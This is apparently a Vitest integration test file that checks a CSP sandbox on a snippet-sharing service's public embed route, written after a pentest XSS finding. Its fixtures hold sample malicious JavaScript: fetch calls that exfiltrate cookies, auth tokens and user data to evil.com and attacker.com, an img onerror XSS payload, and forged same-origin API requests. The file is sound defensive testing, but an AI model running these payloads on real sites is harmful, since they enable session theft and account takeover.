import { describe, expect, it, vi, beforeEach } from 'vitest';
import { applyPublicEmbedHeaders } from '../../common/utilities/embed-headers';

// Mock all dependencies before importing the service
vi.mock('../../common/utilities/transaction', () => ({
  executeInTransaction: async (fn: (t: unknown) => Promise<unknown>) => fn(undefined),
}));

vi.mock('../../common/utilities/logger', () => ({
  default: { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));

vi.mock('../../modules/snippet/snippet.repo', () => ({
  findByShortId: vi.fn(),
  incrementSnippetEmbedCount: vi.fn().mockResolvedValue(undefined),
}));

vi.mock('../../modules/snippet/snippetView.repo', () => ({
  findSnippetView: vi.fn(),
  upsertSnippetView: vi.fn(),
}));

vi.mock('../../modules/favorite/favorite.repo', () => ({
  findFavoritedSnippetIds: vi.fn().mockResolvedValue(new Set()),
}));

vi.mock('../../modules/follow/follow.repo', () => ({
  findFollowingIds: vi.fn().mockResolvedValue([]),
}));

vi.mock('../../modules/user/user.repo', () => ({
  findByUsername: vi.fn(),
}));

vi.mock('../../database/minio', () => ({
  minioClient: { putObject: vi.fn(), removeObject: vi.fn() },
  latchMinioUnavailable: vi.fn(),
  isMinioConnectionError: vi.fn().mockReturnValue(false),
}));

import { getSnippetEmbedHtmlHandler } from '../../modules/snippet/snippet.service';
import { findByShortId } from '../../modules/snippet/snippet.repo';

describe('Snippet Embed XSS Mitigation - Integration Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Pentest reproduction scenarios', () => {
    it('prevents XSS when attacker creates snippet with malicious JavaScript', async () => {
      // Pentest Step 5: "Snippet authors can submit content for the JavaScript file type"
      const maliciousSnippet = {
        shortId: 'xss123',
        name: 'Malicious Snippet',
        isPrivate: false,
        snippetFiles: [
          { fileType: 'html', content: '<div id="target">Click me</div>' },
          { fileType: 'css', content: 'body { margin: 0; }' },
          {
            fileType: 'js',
            content: `
              // Attacker's malicious code attempting to steal session
              fetch('/api/user/me', { credentials: 'include' })
                .then(r => r.json())
                .then(data => {
                  // Try to exfiltrate user data
                  fetch('https://evil.com/steal?data=' + JSON.stringify(data));
                });
              
              // Try to access localStorage
              const token = localStorage.getItem('auth_token');
              if (token) {
                fetch('https://evil.com/token?t=' + token);
              }
            `,
          },
        ],
        cdnResources: [],
      };

      vi.mocked(findByShortId).mockResolvedValue(maliciousSnippet as any);

      // Pentest Step 2: "The generated document is returned directly as an HTML response"
      const html = await getSnippetEmbedHtmlHandler({ params: { shortId: 'xss123' } });

      // Verify the malicious JavaScript is included (as intended for snippet functionality)
      expect(html).toContain('fetch(\'/api/user/me\'');
      expect(html).toContain('localStorage.getItem');

      // Pentest Step 3: Verify CSP sandbox is applied to prevent exploitation
      const headers: Record<string, string> = {};
      const mockRes = {
        removeHeader: vi.fn(),
        setHeader: vi.fn((name: string, value: string) => {
          headers[name] = value;
        }),
      };

      applyPublicEmbedHeaders(mockRes as any);

      const csp = headers['Content-Security-Policy'];

      // Critical mitigation: sandbox without allow-same-origin creates opaque origin
      // This prevents the malicious script from:
      // 1. Accessing same-origin cookies/storage
      // 2. Making same-origin authenticated requests
      // 3. Reading responses from same-origin APIs
      expect(csp).toContain('sandbox');
      expect(csp).not.toContain('allow-same-origin');
      expect(csp).toContain('allow-scripts');
    });

    it('prevents session hijacking via cookie access in embed', async () => {
      const snippetWithCookieTheft = {
        shortId: 'cookie123',
        name: 'Cookie Theft Attempt',
        isPrivate: false,
        snippetFiles: [
          { fileType: 'html', content: '<h1>Innocent Looking Page</h1>' },
          { fileType: 'css', content: '' },
          {
            fileType: 'js',
            content: `
              // Attempt to steal cookies
              const cookies = document.cookie;
              fetch('https://attacker.com/log?c=' + encodeURIComponent(cookies));
            `,
          },
        ],
        cdnResources: [],
      };

      vi.mocked(findByShortId).mockResolvedValue(snippetWithCookieTheft as any);

      await getSnippetEmbedHtmlHandler({ params: { shortId: 'cookie123' } });

      const headers: Record<string, string> = {};
      const mockRes = {
        removeHeader: vi.fn(),
        setHeader: vi.fn((name: string, value: string) => {
          headers[name] = value;
        }),
      };

      applyPublicEmbedHeaders(mockRes as any);

      const csp = headers['Content-Security-Policy'];

      // Pentest finding: "access to same-origin resources exposed to JavaScript, 
      // including readable web storage and non-HttpOnly data"
      // Mitigation: Opaque origin means document.cookie returns empty string
      // for the application's cookies (they belong to a different origin)
      expect(csp).toContain('sandbox');
      expect(csp).not.toContain('allow-same-origin');
    });

    it('prevents same-origin API requests from attacker-controlled embed', async () => {
      const snippetWithApiExploit = {
        shortId: 'api123',
        name: 'API Exploit Attempt',
        isPrivate: false,
        snippetFiles: [
          { fileType: 'html', content: '<div>Loading...</div>' },
          { fileType: 'css', content: '' },
          {
            fileType: 'js',
            content: `
              // Attempt to make authenticated API calls
              fetch('/api/snippets', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name: 'Malicious', isPrivate: false }),
                credentials: 'include'
              });
              
              // Attempt to delete user's snippets
              fetch('/api/snippets/some-id', {
                method: 'DELETE',
                credentials: 'include'
              });
            `,
          },
        ],
        cdnResources: [],
      };

      vi.mocked(findByShortId).mockResolvedValue(snippetWithApiExploit as any);

      await getSnippetEmbedHtmlHandler({ params: { shortId: 'api123' } });

      const headers: Record<string, string> = {};
      const mockRes = {
        removeHeader: vi.fn(),
        setHeader: vi.fn((name: string, value: string) => {
          headers[name] = value;
        }),
      };

      applyPublicEmbedHeaders(mockRes as any);

      const csp = headers['Content-Security-Policy'];

      // Pentest finding: "can issue or read same-origin requests in the victim's browser session"
      // Mitigation: Opaque origin means fetch('/api/...') is cross-origin,
      // and credentials won't be sent (or will be blocked by CORS)
      expect(csp).toContain('sandbox');
      expect(csp).not.toContain('allow-same-origin');
    });

    it('prevents localStorage/sessionStorage access from embed', async () => {
      const snippetWithStorageAccess = {
        shortId: 'storage123',
        name: 'Storage Access Attempt',
        isPrivate: false,
        snippetFiles: [
          { fileType: 'html', content: '<div>Test</div>' },
          { fileType: 'css', content: '' },
          {
            fileType: 'js',
            content: `
              // Attempt to read application storage
              const authToken = localStorage.getItem('auth_token');
              const sessionData = sessionStorage.getItem('session');
              
              // Try to exfiltrate
              if (authToken || sessionData) {
                fetch('https://evil.com/steal', {
                  method: 'POST',
                  body: JSON.stringify({ authToken, sessionData })
                });
              }
            `,
          },
        ],
        cdnResources: [],
      };

      vi.mocked(findByShortId).mockResolvedValue(snippetWithStorageAccess as any);

      await getSnippetEmbedHtmlHandler({ params: { shortId: 'storage123' } });

      const headers: Record<string, string> = {};
      const mockRes = {
        removeHeader: vi.fn(),
        setHeader: vi.fn((name: string, value: string) => {
          headers[name] = value;
        }),
      };

      applyPublicEmbedHeaders(mockRes as any);

      const csp = headers['Content-Security-Policy'];

      // Pentest finding: "access same-origin resources exposed to JavaScript, 
      // including readable web storage"
      // Mitigation: Opaque origin has its own separate storage,
      // cannot access the application's localStorage/sessionStorage
      expect(csp).toContain('sandbox');
      expect(csp).not.toContain('allow-same-origin');
    });
  });

  describe('Embed functionality preservation', () => {
    it('allows legitimate snippet JavaScript to execute', async () => {
      const legitimateSnippet = {
        shortId: 'legit123',
        name: 'Interactive Demo',
        isPrivate: false,
        snippetFiles: [
          { fileType: 'html', content: '<button id="btn">Click me</button><div id="output"></div>' },
          { fileType: 'css', content: 'button { padding: 10px; }' },
          {
            fileType: 'js',
            content: `
              document.getElementById('btn').addEventListener('click', () => {
                document.getElementById('output').textContent = 'Clicked!';
              });
            `,
          },
        ],
        cdnResources: [],
      };

      vi.mocked(findByShortId).mockResolvedValue(legitimateSnippet as any);

      const html = await getSnippetEmbedHtmlHandler({ params: { shortId: 'legit123' } });

      // Verify legitimate JavaScript is included
      expect(html).toContain('addEventListener');
      expect(html).toContain('getElementById');

      const headers: Record<string, string> = {};
      const mockRes = {
        removeHeader: vi.fn(),
        setHeader: vi.fn((name: string, value: string) => {
          headers[name] = value;
        }),
      };

      applyPublicEmbedHeaders(mockRes as any);

      const csp = headers['Content-Security-Policy'];

      // Scripts can execute (allow-scripts)
      expect(csp).toContain('allow-scripts');
      // But in isolated context (no allow-same-origin)
      expect(csp).not.toContain('allow-same-origin');
    });

    it('allows forms and modals for interactive snippets', async () => {
      const interactiveSnippet = {
        shortId: 'form123',
        name: 'Form Demo',
        isPrivate: false,
        snippetFiles: [
          {
            fileType: 'html',
            content: '<form><input name="test"><button type="submit">Submit</button></form>',
          },
          { fileType: 'css', content: '' },
          {
            fileType: 'js',
            content: `
              document.querySelector('form').addEventListener('submit', (e) => {
                e.preventDefault();
                alert('Form submitted!');
              });
            `,
          },
        ],
        cdnResources: [],
      };

      vi.mocked(findByShortId).mockResolvedValue(interactiveSnippet as any);

      await getSnippetEmbedHtmlHandler({ params: { shortId: 'form123' } });

      const headers: Record<string, string> = {};
      const mockRes = {
        removeHeader: vi.fn(),
        setHeader: vi.fn((name: string, value: string) => {
          headers[name] = value;
        }),
      };

      applyPublicEmbedHeaders(mockRes as any);

      const csp = headers['Content-Security-Policy'];

      // Required for snippet functionality
      expect(csp).toContain('allow-forms');
      expect(csp).toContain('allow-modals');
      expect(csp).toContain('allow-popups');
      
      // But still isolated
      expect(csp).not.toContain('allow-same-origin');
    });
  });

  describe('Edge cases and attack variations', () => {
    it('prevents DOM-based XSS via script injection in HTML content', async () => {
      const snippetWithHtmlInjection = {
        shortId: 'dom123',
        name: 'DOM XSS Attempt',
        isPrivate: false,
        snippetFiles: [
          {
            fileType: 'html',
            content: '<div id="user-content"></div>',
          },
          { fileType: 'css', content: '' },
          {
            fileType: 'js',
            content: `
              // Simulate user input that could be exploited
              const userInput = '<img src=x onerror="fetch(\'/api/user/me\').then(r=>r.json()).then(d=>fetch(\'https://evil.com?data=\'+JSON.stringify(d)))">';
              document.getElementById('user-content').innerHTML = userInput;
            `,
          },
        ],
        cdnResources: [],
      };

      vi.mocked(findByShortId).mockResolvedValue(snippetWithHtmlInjection as any);

      const html = await getSnippetEmbedHtmlHandler({ params: { shortId: 'dom123' } });

      // The malicious code is present (as intended for snippet functionality)
      expect(html).toContain('innerHTML');

      const headers: Record<string, string> = {};
      const mockRes = {
        removeHeader: vi.fn(),
        setHeader: vi.fn((name: string, value: string) => {
          headers[name] = value;
        }),
      };

      applyPublicEmbedHeaders(mockRes as any);

      const csp = headers['Content-Security-Policy'];

      // Even if the injected script executes, it runs in opaque origin
      expect(csp).toContain('sandbox');
      expect(csp).not.toContain('allow-same-origin');
    });

    it('prevents window.parent access to application context', async () => {
      const snippetWithFrameBusting = {
        shortId: 'frame123',
        name: 'Frame Access Attempt',
        isPrivate: false,
        snippetFiles: [
          { fileType: 'html', content: '<div>Test</div>' },
          { fileType: 'css', content: '' },
          {
            fileType: 'js',
            content: `
              // Attempt to access parent window
              try {
                window.parent.location.href = 'https://evil.com';
              } catch (e) {
                console.log('Blocked:', e);
              }
              
              // Attempt to read parent data
              try {
                const parentData = window.parent.localStorage;
              } catch (e) {
                console.log('Blocked:', e);
              }
            `,
          },
        ],
        cdnResources: [],
      };

      vi.mocked(findByShortId).mockResolvedValue(snippetWithFrameBusting as any);

      await getSnippetEmbedHtmlHandler({ params: { shortId: 'frame123' } });

      const headers: Record<string, string> = {};
      const mockRes = {
        removeHeader: vi.fn(),
        setHeader: vi.fn((name: string, value: string) => {
          headers[name] = value;
        }),
      };

      applyPublicEmbedHeaders(mockRes as any);

      const csp = headers['Content-Security-Policy'];

      // Sandbox prevents top navigation and cross-origin access
      expect(csp).toContain('sandbox');
      expect(csp).not.toContain('allow-top-navigation');
      expect(csp).not.toContain('allow-same-origin');
    });

    it('handles CDN resources without compromising sandbox', async () => {
      const snippetWithCdn = {
        shortId: 'cdn123',
        name: 'CDN Test',
        isPrivate: false,
        snippetFiles: [
          { fileType: 'html', content: '<div class="styled">Test</div>' },
          { fileType: 'css', content: '.styled { color: blue; }' },
          { fileType: 'js', content: 'console.log("loaded");' },
        ],
        cdnResources: [
          { resourceType: 'css', url: 'https://cdn.example.com/style.css' },
          { resourceType: 'js', url: 'https://cdn.example.com/lib.js' },
        ],
      };

      vi.mocked(findByShortId).mockResolvedValue(snippetWithCdn as any);

      const html = await getSnippetEmbedHtmlHandler({ params: { shortId: 'cdn123' } });

      // CDN resources are included
      expect(html).toContain('https://cdn.example.com/style.css');
      expect(html).toContain('https://cdn.example.com/lib.js');

      const headers: Record<string, string> = {};
      const mockRes = {
        removeHeader: vi.fn(),
        setHeader: vi.fn((name: string, value: string) => {
          headers[name] = value;
        }),
      };

      applyPublicEmbedHeaders(mockRes as any);

      const csp = headers['Content-Security-Policy'];

      // Even with external resources, sandbox is enforced
      expect(csp).toContain('sandbox');
      expect(csp).not.toContain('allow-same-origin');
    });
  });

  describe('Private snippet protection', () => {
    it('returns 404 for private snippets preventing information disclosure', async () => {
      const privateSnippet = {
        shortId: 'private123',
        name: 'Private Snippet',
        isPrivate: true,
        snippetFiles: [
          { fileType: 'html', content: '<div>Secret</div>' },
          { fileType: 'css', content: '' },
          { fileType: 'js', content: 'console.log("secret");' },
        ],
        cdnResources: [],
      };

      vi.mocked(findByShortId).mockResolvedValue(privateSnippet as any);

      // Pentest Step 4: "The embed route is a public-read route"
      // But private snippets should not be accessible
      await expect(
        getSnippetEmbedHtmlHandler({ params: { shortId: 'private123' } })
      ).rejects.toMatchObject({ statusCode: 404 });
    });
  });
});
